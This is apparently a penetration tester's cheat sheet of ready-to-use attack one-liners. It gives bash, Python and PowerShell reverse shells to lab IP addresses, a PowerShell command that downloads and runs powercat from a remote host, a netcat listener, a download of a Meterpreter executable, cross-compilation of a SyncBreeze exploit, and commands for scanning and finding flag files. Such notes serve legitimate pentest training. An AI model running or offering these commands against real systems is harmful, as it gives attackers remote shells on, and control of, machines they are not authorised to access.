| **Reverse shells** | **Description** |
| ---- | ---- |
| `bash -i >& /dev/tcp/192.168.119.3/4444 0>&1` | Common reverse shell |
| `bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"` | If prior shell doesn't work due to Bourne Shell |
| `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.45.190",9001));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'` | Python reverse shell |
| `IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.190/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell` | Powershell reverse shell with PowerCat |

| **Netcat listener** | **Description** |
| ---- | ---- |
| `nc -nvlp 9001` | In port 9001 |

| **Banner grabbing** | **Description** |
| ---- | ---- |
| `telnet 10.10.10.10 22` | For ip 10.10.10.10 in port 22 |


Google dork to search exploits (Instead of searchsploit):
```text
phpMyAdmin 4.9.2 site:exploit-db.com
```

Extract metadata from a file

```
exiftool -a -u brochure.pdf
```

#### Windows

PS - Get local user
```shell
Get-LocalUser
```

Check current shell:
```shell
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

Cross-platform exploit compiling:
```bash
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe
```

If we get errors due to the linker cannot find the winsock library:
```bash
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
```

Find filename:
```shell
dir -Path C:\  -Include flag.txt -File -Recurse -ErrorAction SilentlyContinue
```

Retrieve a file in Powershell (same as wget)
```shell
iwr -uri http://192.168.119.2/met.exe -Outfile met.exe
```


| Enumerating | **Description** |
| ---- | ---- |
| `for i in $(cat ../internal-network.txt); do mkdir -p $i/nmap; nmap -p- --min-rate=10000 --open $i -oA "$i/nmap/quick-scan"; done` | Quick scan from scope file |
|  |  |